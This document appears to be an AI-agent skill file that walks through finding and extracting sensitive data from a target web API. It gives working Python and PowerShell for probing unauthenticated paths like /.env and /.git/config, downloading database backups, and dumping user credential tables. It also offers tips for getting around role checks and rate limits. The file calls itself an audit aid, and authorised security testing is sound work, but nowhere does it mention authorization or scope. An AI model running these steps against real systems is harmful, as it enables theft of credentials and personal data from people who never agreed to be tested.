---
name: sensitive-data-exposure
description: 'Discover and extract sensitive data exposed through misconfigured API endpoints, unauthenticated routes, database backups, debug information, and overly verbose responses. Covers finding exposed credentials, PII, internal data, and downloadable backups. USE FOR: find exposed data, download database backup, extract credentials from API, discover unauthenticated endpoints, enumerate sensitive fields, API information disclosure, debug endpoint discovery, exposed PII. DO NOT USE FOR: SQL injection based data extraction, XSS for credential theft, network-level data interception, brute force attacks.'
argument-hint: 'Target base URL to audit for data exposure (e.g. "check this API for exposed sensitive data")'
---

# Sensitive Data Exposure

> **Prerequisite:** Python 3 with `requests`. Optionally `sqlite3` for database analysis.

## Step 1 — Discover Unauthenticated Endpoints

Probe common API paths without any authentication:

```python
import requests

base = "<target>"
endpoints = [
    "/api/users/", "/api/users", "/api/user/",
    "/api/profiles/", "/api/accounts/",
    "/api/config/", "/api/settings/",
    "/api/backup/", "/api/db/", "/api/export/",
    "/api/debug/", "/api/health/", "/api/status/",
    "/api/docs/", "/api/swagger/", "/api/schema/",
    "/api/admin/", "/admin/",
    "/.env", "/config.json", "/package.json",
    "/robots.txt", "/sitemap.xml",
]

for ep in endpoints:
    try:
        resp = requests.get(f"{base}{ep}", timeout=5)
        if resp.status_code == 200:
            ctype = resp.headers.get('content-type', '')
            print(f"[OPEN] {ep:40s} {resp.status_code} {ctype} ({len(resp.content)} bytes)")
    except requests.RequestException:
        pass
```

## Step 2 — Analyse Verbose API Responses

Check if API responses include fields that shouldn't be there:

```python
resp = requests.get(f"{base}/api/users/", headers=auth_headers)
users = resp.json()

# Flag sensitive-looking fields
sensitive_patterns = [
    'password', 'hash', 'secret', 'token', 'key', 'ssn',
    'credit_card', 'clear_text', 'salt', 'private',
    'api_key', 'session', 'cookie'
]

if isinstance(users, list) and users:
    sample = users[0]
    for key in sample.keys():
        if any(p in key.lower() for p in sensitive_patterns):
            print(f"SENSITIVE FIELD: '{key}' = {sample[key]}")
```

Common over-exposures:
- Password hashes in user listings
- Cleartext passwords stored alongside hashes
- Internal IDs, email addresses, or phone numbers
- API keys or tokens in profile responses
- Debug info or stack traces in error responses

## Step 3 — Check for Database Backups

Many admin panels expose database download functionality:

```python
backup_endpoints = [
    "/api/backup/", "/api/backup", "/api/db/backup",
    "/api/database/", "/api/export/db",
    "/backup.sql", "/backup.db", "/db.sqlite3",
    "/dump.sql", "/database.sql",
]

for ep in backup_endpoints:
    resp = requests.get(f"{base}{ep}", headers=auth_headers, timeout=10)
    if resp.status_code == 200 and len(resp.content) > 100:
        ctype = resp.headers.get('content-type', '')
        print(f"[DATABASE] {ep} — {len(resp.content)} bytes, {ctype}")
        
        # Save and inspect
        filename = ep.strip('/').replace('/', '_') + '.db'
        with open(filename, 'wb') as f:
            f.write(resp.content)
```

## Step 4 — Extract Data from Database Backups

```python
import sqlite3

conn = sqlite3.connect('backup.db')
cursor = conn.cursor()

# List all tables
cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
tables = [r[0] for r in cursor.fetchall()]
print("Tables:", tables)

# Dump schema
for table in tables:
    cursor.execute(f"PRAGMA table_info({table})")
    columns = cursor.fetchall()
    print(f"\n{table}:")
    for col in columns:
        print(f"  {col[1]:30s} {col[2]}")

# Extract user credentials
user_tables = [t for t in tables if 'user' in t.lower() or 'auth' in t.lower() or 'account' in t.lower()]
for table in user_tables:
    cursor.execute(f"SELECT * FROM {table}")
    rows = cursor.fetchall()
    col_names = [d[0] for d in cursor.description]
    print(f"\n{table} ({len(rows)} rows):")
    for row in rows:
        record = dict(zip(col_names, row))
        print(f"  {record}")

conn.close()
```

## Step 5 — Check for Source Maps and Debug Files

```powershell
# Source maps expose full unminified source code
$jsFiles = Invoke-WebRequest -Uri "<target>" -UseBasicParsing |
    Select-String -Pattern 'src="([^"]*\.js)"' -AllMatches |
    ForEach-Object { $_.Matches.Value }

foreach ($js in $jsFiles) {
    $mapUrl = "$js.map"
    $resp = Invoke-WebRequest -Uri "<target>$mapUrl" -UseBasicParsing -ErrorAction SilentlyContinue
    if ($resp.StatusCode -eq 200) {
        Write-Host "[SOURCE MAP] $mapUrl — $($resp.Content.Length) bytes"
    }
}
```

Also check for:
```
/.git/config
/.env
/.env.local
/debug/
/phpinfo.php
/server-status
/elmah.axd
```

## Step 6 — Assess and Document Findings

Categorise the exposed data by severity:

| Severity | Examples |
|----------|----------|
| **Critical** | Cleartext passwords, database backups, API signing keys, private keys |
| **High** | Password hashes, JWT secrets, admin credentials, PII (SSN, financial) |
| **Medium** | Email addresses, internal user IDs, role assignments, debug info |
| **Low** | Usernames, public profile data, version numbers |

## Common Pitfalls

- **Authentication required but not enforced** — some backup/export endpoints check for a valid token but not for admin role. Try with any authenticated user.
- **Content-Type mismatch** — a database backup may be served as `application/octet-stream`, `application/json`, or even `text/html`. Check the actual content, not the header.
- **Different auth for different endpoints** — the API may use JWT tokens while admin endpoints use session cookies. Try both.
- **Rate limiting / WAF** — rapid endpoint probing may trigger rate limits. Space requests out if you're getting 429s.
- **Ephemeral data** — some debug endpoints only expose data under certain conditions (e.g. after an error). Try triggering errors first.
